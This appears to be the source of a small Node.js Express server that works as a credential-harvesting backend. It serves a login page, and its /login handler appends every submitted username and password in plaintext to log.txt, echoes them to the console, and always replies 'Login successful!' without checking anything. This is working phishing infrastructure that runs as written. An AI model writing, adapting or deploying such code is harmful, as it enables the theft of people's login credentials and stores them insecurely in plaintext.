const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;
const os = require('os');

app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
    const serverIP = req.connection.localAddress || req.ip;
    console.log(`Server IP Address: ${serverIP}`);
    console.log(`${req.method} ${req.url} from ${req.ip}`);
    next();
});

app.get('/', (req, res) => {
	const htmlFilePath = path.join(__dirname, 'index.html'); 
    res.sendFile(htmlFilePath);
});

app.use(express.json());
const filename = "log.txt";

app.post('/login', (req, res) => {
    const { username, password } = req.body;
	
    fs.appendFile(filename, `Username: ${username}, Password: ${password}\n`, (err) => {
        if (err) {
            console.error(`Error logging to ${filename}: ${err}`);
			res.status(500).send('Internal Server Error');
        } else {
            console.log(`Logged to ${filename}: Username: ${username}, Password: ${password}`);
			
        }
    });
    res.send('Login successful!');
});

function getLocalIpAddress() {
    const networkInterfaces = os.networkInterfaces();
    let localIpAddress;

    Object.keys(networkInterfaces).forEach((interfaceName) => {
        const interfaces = networkInterfaces[interfaceName];

        interfaces.forEach((interfaceInfo) => {
            if (interfaceInfo.family === 'IPv4' && !interfaceInfo.internal) {
                localIpAddress = interfaceInfo.address;
            }
        });
    });

    return localIpAddress;
}

const localIpAddress = getLocalIpAddress();

app.listen(port, localIpAddress, () => {
    console.log(`Server running at http://${localIpAddress}:${port}`);
});
